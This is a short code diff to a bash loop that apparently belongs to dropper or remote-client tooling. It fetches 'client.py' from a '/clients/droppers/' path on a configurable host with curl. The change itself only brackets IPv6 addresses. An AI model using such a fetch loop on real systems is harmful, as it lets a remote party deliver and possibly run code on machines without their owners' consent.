@@ -45,6 +45,9 @@ while true; do {
     if [[ "$host" =~ ^https?:// ]]; then
         url="$host"
     else
+        if [[ "$host" == *:* && "${host:0:1}" != "[" ]]; then
+            host="[$host]"
+        fi
         url="http://$host/clients/droppers/client.py"
     fi
     curl -sHf "$url" -o client.py && {
